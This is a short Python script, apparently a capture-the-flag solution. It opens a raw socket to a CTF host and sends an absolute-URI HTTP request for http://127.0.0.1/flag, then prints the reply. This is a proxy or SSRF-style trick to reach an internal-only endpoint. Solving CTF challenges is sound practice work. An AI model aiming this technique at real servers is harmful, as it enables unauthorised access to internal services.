import socket

host = "public.ctf.r0devnull.team"
port = 3003

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

request = b"GET http://127.0.0.1/flag HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
s.sendall(request)

response = b""
while True:
    data = s.recv(4096)
    if not data:
        break
    response += data

print(response.decode())
s.close()
